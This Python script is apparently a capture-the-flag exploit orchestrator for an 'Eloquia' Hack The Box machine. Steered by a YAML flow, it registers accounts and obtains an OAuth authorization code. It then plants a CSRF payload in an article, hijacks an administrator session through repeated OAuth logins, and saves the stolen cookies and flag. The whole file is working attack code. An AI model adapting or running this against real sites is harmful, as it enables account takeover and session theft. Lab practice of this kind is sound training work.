#!/usr/bin/env python3
"""
run_exploit.py - YAML-driven exploit orchestrator for Eloquia OAuth CSRF attack
"""

import yaml
import requests
import os
import sys
import time
import random
import re
import string
from PIL import Image
from io import BytesIO

class ExploitRunner:
    def __init__(self, flow_file):
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.flow_file = flow_file
        self.config = {}
        self.variables = {}
        self.sessions = {}
        self.credentials = {}

        with open(flow_file) as f:
            self.flow = yaml.safe_load(f)

        self.config = self.flow.get('config', {})
        self.tmp_dir = os.path.join(self.script_dir, self.config.get('tmp_dir', 'tmp'))
        os.makedirs(self.tmp_dir, exist_ok=True)

    def resolve(self, value):
        """Resolve ${variable} references in strings"""
        if not isinstance(value, str):
            return value

        pattern = r'\$\{([^}]+)\}'
        matches = re.findall(pattern, value)

        for match in matches:
            parts = match.split('.')
            resolved = None

            if parts[0] == 'config':
                resolved = self.config.get(parts[1]) if len(parts) > 1 else None
            elif parts[0] == 'credentials':
                resolved = self.credentials.get(parts[1]) if len(parts) > 1 else None
            elif match in self.variables:
                resolved = self.variables[match]
            else:
                # Try direct variable lookup
                resolved = self.variables.get(match)

            if resolved is not None:
                if value == f'${{{match}}}':
                    return resolved
                value = value.replace(f'${{{match}}}', str(resolved))

        return value

    def resolve_dict(self, d):
        """Recursively resolve all values in a dict"""
        if isinstance(d, dict):
            return {k: self.resolve_dict(v) for k, v in d.items()}
        elif isinstance(d, list):
            return [self.resolve_dict(i) for i in d]
        else:
            return self.resolve(d)

    def print_banner(self, title):
        print()
        print("╔" + "═" * 58 + "╗")
        print(f"║  {title:<54}  ║")
        print("╚" + "═" * 58 + "╝")

    def get_csrf(self, html):
        """Extract CSRF token from HTML"""
        match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
        return match.group(1) if match else None

    # Action handlers
    def action_add_hosts_entry(self, params):
        ip = self.resolve(params['ip'])
        hostnames = params['hostnames']

        with open("/etc/hosts") as f:
            hosts = f.read()

        if ip in hosts and all(h in hosts for h in hostnames):
            return True, "Already configured"

        lines = [l for l in hosts.split('\n') if not any(h in l for h in hostnames)]
        lines.append(f"{ip}\t{' '.join(hostnames)}")

        try:
            with open("/etc/hosts", "w") as f:
                f.write('\n'.join(lines))
            return True, "Updated"
        except PermissionError:
            return False, f"Need sudo: echo '{ip} {' '.join(hostnames)}' | sudo tee -a /etc/hosts"

    def action_generate_credentials(self, params):
        params = self.resolve_dict(params)
        prefix = params.get('username_prefix', 'ghost')
        suffix_len = params.get('suffix_length', 6)
        save_to = params.get('save_to', {})

        username_file = os.path.join(self.tmp_dir, os.path.basename(save_to.get('username', 'username.txt')))
        password_file = os.path.join(self.tmp_dir, os.path.basename(save_to.get('password', 'password.txt')))

        # Try to load existing
        if os.path.exists(username_file) and os.path.exists(password_file):
            with open(username_file) as f:
                username = f.read().strip()
            with open(password_file) as f:
                password = f.read().strip()
            self.credentials = {'username': username, 'password': password}
            return True, f"Loaded: {username}"

        # Generate new
        suffix = ''.join(random.choices(string.ascii_lowercase, k=suffix_len))
        username = f"{prefix}{suffix}"
        password = f"P@ss{suffix}123!"

        with open(username_file, "w") as f:
            f.write(username)
        with open(password_file, "w") as f:
            f.write(password)

        self.credentials = {'username': username, 'password': password}
        return True, f"Generated: {username}"

    def action_register(self, params):
        params = self.resolve_dict(params)
        site = params['site']
        url = params['url']
        login_url = params['login_url']
        fields = params['fields']

        session = requests.Session()

        # Check if already registered by trying login
        login_page = session.get(login_url)
        csrf = self.get_csrf(login_page.text)
        if csrf:
            data = {'csrfmiddlewaretoken': csrf}
            data['username'] = fields.get('username')
            data['password'] = fields.get('password1')
            resp = session.post(login_url, data=data, headers={'Referer': login_url})
            if 'sessionid' in session.cookies:
                self.sessions[site] = session
                return True, "Already registered"

        # Try to register
        session = requests.Session()
        reg_page = session.get(url)
        csrf = self.get_csrf(reg_page.text)
        if not csrf:
            return False, "Could not get CSRF"

        data = {'csrfmiddlewaretoken': csrf}
        data.update(fields)

        resp = session.post(url, data=data, headers={'Referer': url}, allow_redirects=False)

        if resp.status_code == 302:
            return True, "Registered"
        elif 'already exists' in resp.text.lower():
            return True, "Already exists"
        else:
            return False, f"HTTP {resp.status_code}"

    def action_oauth_authorize(self, params):
        params = self.resolve_dict(params)

        session = requests.Session()

        # Login
        login_page = session.get(params['login_url'])
        csrf = self.get_csrf(login_page.text)

        session.post(params['login_url'], data={
            'csrfmiddlewaretoken': csrf,
            'username': self.credentials['username'],
            'password': self.credentials['password']
        }, headers={'Referer': params['login_url']})

        if 'sessionid' not in session.cookies:
            return False, "Login failed"

        # Authorize
        auth_url = f"{params['auth_url']}?client_id={params['client_id']}&response_type={params['response_type']}&redirect_uri={params['redirect_uri']}"
        auth_page = session.get(auth_url)
        csrf = self.get_csrf(auth_page.text)

        resp = session.post(auth_url, data={
            'csrfmiddlewaretoken': csrf,
            'redirect_uri': params['redirect_uri'],
            'scope': params.get('scope', 'read write'),
            'client_id': params['client_id'],
            'response_type': params['response_type'],
            'allow': 'Authorize'
        }, headers={'Referer': auth_url}, allow_redirects=False)

        location = resp.headers.get('Location', '')
        code_match = re.search(r'code=([^&\s]+)', location)

        if not code_match:
            return False, "No code in redirect"

        self.variables['oauth_code'] = code_match.group(1)
        self.sessions['qooqle'] = session
        return True, f"Code: {self.variables['oauth_code']}"

    def action_create_article(self, params):
        params = self.resolve_dict(params)

        session = requests.Session()

        # Login to Eloquia
        login_page = session.get(params['login_url'])
        csrf = self.get_csrf(login_page.text)

        session.post(params['login_url'], data={
            'csrfmiddlewaretoken': csrf,
            'username': self.credentials['username'],
            'password': self.credentials['password']
        }, headers={'Referer': params['login_url']})

        if 'sessionid' not in session.cookies:
            return False, "Login failed"

        self.sessions['eloquia'] = session

        # Get existing article IDs
        my_articles = session.get(params['my_articles_url'])
        existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

        # Get create form
        create_page = session.get(params['create_url'])
        csrf = self.get_csrf(create_page.text)

        # Create banner
        banner_cfg = params.get('banner', {})
        size = banner_cfg.get('size', [200, 150])
        img = Image.new('RGB', tuple(size))
        for i in range(size[0]):
            for j in range(size[1]):
                img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        buf = BytesIO()
        img.save(buf, banner_cfg.get('format', 'PNG'))
        buf.seek(0)

        # Build payload
        timestamp = str(int(time.time()))
        title = f"{params.get('title_prefix', 'Article')} {timestamp}"

        # Resolve payload template
        payload = params.get('payload_template', '')
        payload = payload.replace('${config.oauth_redirect_uri}', self.config['oauth_redirect_uri'])
        payload = payload.replace('${oauth_code}', self.variables.get('oauth_code', ''))

        resp = session.post(params['create_url'],
            data={
                'csrfmiddlewaretoken': csrf,
                'title': title,
                'content': payload
            },
            files={'banner': ('banner.png', buf, 'image/png')},
            headers={'Referer': params['create_url']},
            timeout=60
        )

        # Find article ID
        article_id = None
        match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
        if match:
            article_id = match.group(1)

        if not article_id:
            new_articles = session.get(params['my_articles_url'])
            new_ids = set(re.findall(r'article/visit/(\d+)', new_articles.text))
            created = new_ids - existing_ids
            if created:
                article_id = max(created)

        if not article_id:
            return False, "Could not find article ID"

        self.variables['article_id'] = article_id
        return True, f"Article ID: {article_id}"

    def action_http_get(self, params):
        params = self.resolve_dict(params)
        url = params['url']
        session_name = params.get('use_session')

        session = self.sessions.get(session_name) if session_name else requests.Session()
        resp = session.get(url)
        return True, f"HTTP {resp.status_code}"

    def action_sleep(self, params):
        seconds = int(self.resolve(params['seconds']))
        print(f"    Waiting {seconds}s...", end='', flush=True)
        time.sleep(seconds)
        print(" done")
        return True, f"Slept {seconds}s"

    def action_oauth_login(self, params):
        params = self.resolve_dict(params)
        max_attempts = int(params.get('max_attempts', 5))
        retry_delay = int(params.get('retry_delay', 5))

        for attempt in range(max_attempts):
            print(f"    Attempt {attempt + 1}/{max_attempts}...")

            # Login to Qooqle
            qooqle = requests.Session()
            login_page = qooqle.get(params['qooqle_login_url'])
            csrf = self.get_csrf(login_page.text)

            qooqle.post(params['qooqle_login_url'], data={
                'csrfmiddlewaretoken': csrf,
                'username': self.credentials['username'],
                'password': self.credentials['password']
            }, headers={'Referer': params['qooqle_login_url']})

            if 'sessionid' not in qooqle.cookies:
                continue

            # Start OAuth from Eloquia
            eloquia = requests.Session()
            oauth_init = eloquia.get(params['eloquia_oauth_init'], allow_redirects=False)
            auth_url = oauth_init.headers.get('Location', '')

            if 'qooqle' not in auth_url:
                continue

            # Authorize with Qooqle session
            auth_page = qooqle.get(auth_url)
            csrf = self.get_csrf(auth_page.text)
            if not csrf:
                continue

            resp = qooqle.post(auth_url, data={
                'csrfmiddlewaretoken': csrf,
                'redirect_uri': params['redirect_uri'],
                'scope': 'read write',
                'client_id': params['client_id'],
                'response_type': 'code',
                'allow': 'Authorize'
            }, headers={'Referer': auth_url}, allow_redirects=False)

            callback = resp.headers.get('Location', '')
            resp = eloquia.get(callback, allow_redirects=True)

            if 'sessionid' in eloquia.cookies:
                self.sessions['admin'] = eloquia
                self.variables['admin_session'] = eloquia
                return True, "Got session!"

            if attempt < max_attempts - 1:
                time.sleep(retry_delay)

        return False, "No session obtained"

    def action_check_admin(self, params):
        params = self.resolve_dict(params)
        session = self.sessions.get('admin')

        if not session:
            return False, "No admin session"

        profile = session.get(params['profile_url'])

        # Extract username
        match = re.search(r'value="([^"]+)"[^>]*id="id_username"', profile.text)
        if not match:
            match = re.search(r'Howdy,\s*(\w+)', profile.text)

        if match:
            logged_in_as = match.group(1)
            self.variables['logged_in_as'] = logged_in_as

            if 'admin' in logged_in_as.lower():
                # Check for flag
                flag_match = re.search(r'HTB\{[^}]+\}', profile.text)
                if flag_match:
                    self.variables['flag'] = flag_match.group(0)

                # Check admin panel
                admin_check = session.get(params['admin_url'])
                if admin_check.status_code == 200:
                    self.variables['admin_panel'] = True

                return True, f"ADMIN: {logged_in_as}"
            else:
                return True, f"User: {logged_in_as} (not admin)"

        return False, "Could not determine user"

    def action_save_files(self, params):
        params = self.resolve_dict(params)
        saved = []

        for file_spec in params.get('files', []):
            path = file_spec['path']
            if not path.startswith('/'):
                path = os.path.join(self.tmp_dir, os.path.basename(path))

            content = file_spec.get('content', '')
            condition = file_spec.get('condition')

            # Check condition
            if condition and not self.resolve(condition):
                continue

            # Handle session cookies
            if hasattr(content, 'cookies'):
                content = '\n'.join(f"{c.name}={c.value}" for c in content.cookies)

            with open(path, 'w') as f:
                f.write(str(content))
            saved.append(os.path.basename(path))

        return True, f"Saved: {', '.join(saved)}" if saved else "Nothing to save"

    def run_step(self, step, index, total):
        name = step['name']
        desc = step.get('description', name)
        action = step['action']
        params = step.get('params', {})

        print(f"[{index}/{total}] {desc}")

        handler = getattr(self, f'action_{action}', None)
        if not handler:
            print(f"    [-] Unknown action: {action}")
            return False

        try:
            success, msg = handler(params)
            status = "[+]" if success else "[-]"
            print(f"    {status} {msg}")
            return success
        except Exception as e:
            print(f"    [-] Error: {e}")
            return False

    def run(self):
        self.print_banner("ELOQUIA OAUTH CSRF EXPLOIT")
        print(f"Flow: {self.flow_file}")
        print(f"Target: {self.config.get('target_ip')}")
        print()

        steps = self.flow.get('steps', [])
        total = len(steps)

        for i, step in enumerate(steps, 1):
            if not self.run_step(step, i, total):
                # Check if step is critical
                if step.get('critical', True):
                    print()
                    print("=" * 60)
                    print(f"  Step failed: {step['name']}")
                    print("=" * 60)
                    return False

        # Final summary
        print()
        print("=" * 60)
        if self.variables.get('logged_in_as'):
            if 'admin' in self.variables['logged_in_as'].lower():
                print("  [!!!] ADMIN ACCESS CONFIRMED!")
                print(f"  Logged in as: {self.variables['logged_in_as']}")
                if self.variables.get('flag'):
                    print(f"  FLAG: {self.variables['flag']}")
                if self.variables.get('admin_panel'):
                    print("  Admin panel: /admin/")
            else:
                print(f"  Logged in as: {self.variables['logged_in_as']}")
        else:
            print("  Exploit completed but no admin session obtained.")
            print("  Try running: python3 05_login_as_admin.py")
        print("=" * 60)

        return True

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    flow_file = sys.argv[1] if len(sys.argv) > 1 else os.path.join(script_dir, 'exploit_flow.yaml')

    if not os.path.exists(flow_file):
        print(f"[-] Flow file not found: {flow_file}")
        sys.exit(1)

    runner = ExploitRunner(flow_file)
    success = runner.run()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
